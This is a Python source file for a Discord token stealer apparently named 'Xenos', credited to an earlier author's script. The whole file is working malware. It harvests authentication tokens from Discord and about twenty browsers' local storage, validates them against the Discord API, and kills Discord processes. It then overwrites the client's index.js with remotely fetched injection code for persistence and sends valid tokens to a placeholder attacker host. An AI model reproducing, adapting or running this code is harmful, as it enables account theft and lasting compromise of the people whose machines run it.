# Original Python Stealer Made by Its-Vichy
# Original Stealer: https://github.com/Its-Vichy/lets-talk-about-discord/blob/main/colorfull.py

import os, re, threading, urllib.request

class X3N0S:
    def __init__(self):
        self.host = "https://yourwebsite.com"
        self.all_tokens = []
        self.valid_tokens = []
        self.paths = {
            "__ROAMING__/Discord/Local Storage/leveldb",
            "__ROAMING__/Lightcord/Local Storage/leveldb",
            "__ROAMING__/discordcanary/Local Storage/leveldb",
            "__ROAMING__/discordptb/Local Storage/leveldb",
            "__ROAMING__/OperaSoftware/Opera GX Stable/Local Storage/leveldb",
            "__ROAMING__/OperaSoftware/Opera Stable/Local Storage/leveldb",
            "__ROAMING__/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Google/Chrome/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Google/Chrome SxS/User Data/Local Storage/leveldb",
            "__LOCAL__/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Amigo/User Data/Local Storage/leveldb",
            "__LOCAL__/Torch/User Data/Local Storage/leveldb",
            "__LOCAL__/Kometa/User Data/Local Storage/leveldb",
            "__LOCAL__/Orbitum/User Data/Local Storage/leveldb",
            "__LOCAL__/CentBrowser/User Data/Local Storage/leveldb",
            "__LOCAL__/7Star/7Star/User Data/Local Storage/leveldb",
            "__LOCAL__/Sputnik/Sputnik/User Data/Local Storage/leveldb",
            "__LOCAL__/Vivaldi/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/EpicPrivacy Browser/User Data/Local Storage/leveldb",
            "__LOCAL__/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Iridium/User Data/Default/Local Storage/leveld",
        }
        
        for path in self.paths:
            try:
                path = path.replace('__LOCAL__', os.getenv('LOCALAPPDATA')).replace('__ROAMING__', os.getenv('APPDATA'))
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for token in re.findall(regex, line):
                                        if token not in self.all_tokens:self.all_tokens.append(token)
            except:pass
    
    def __Check_Tokens(self):
        threads_worker = []
        def check(token):
            try:
                if urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v9/users/@me', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode() == 200:self.valid_tokens.append(token)
            except:pass
            
        for token in self.all_tokens:threads_worker.append(threading.Thread(target= check, args=(token,)))
        for T in threads_worker:T.start()
        for T in threads_worker:T.join()
    
    def __WriteStub(self):
        for path in [f"{os.getenv('LOCALAPPDATA')}\\discord\\",f"{os.getenv('APPDATA')}\\Discord\\",f"{os.getenv('APPDATA')}\\Lightcord\\",f"{os.getenv('APPDATA')}\\discordptb\\",f"{os.getenv('APPDATA')}\\discordcanary\\"]:
            try:
                end_path = path+""
                if os.path.exists(path):
                    for c in ["app-", "module", "discord_desktop_core", "discord_desktop_core"]:
                        for a in os.listdir(end_path):
                            if c in a:end_path += a + "\\"

                for file in os.listdir(end_path):
                    if "index.js" in file.lower():
                        os.makedirs(end_path+"\\XenosStealer")
                        open(end_path+"index.js", 'w', encoding="UTF-8").write((urllib.request.urlopen(urllib.request.Request("https://raw.githubusercontent.com/KanekiWeb/Xenos/main/Grabber/Injection/injection.js")).read().decode('utf-8')).replace("%WEBHOOK_LINK%", self.host))
            except:pass

    def __KillInstance(self):
        for _ in range(2):
            try:import psutil
            except:os.system('pip install psutil >nul')
        
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):proc.kill()

    def __Main__(self):
        self.__KillInstance()
        self.__WriteStub()
        self.__Check_Tokens()
        for token in self.valid_tokens:
            urllib.request.urlopen(urllib.request.Request(self.host+"/api?type=addtoken&token="+token, method='GET'))

threading.Thread(target=X3N0S().__Main__()).start()
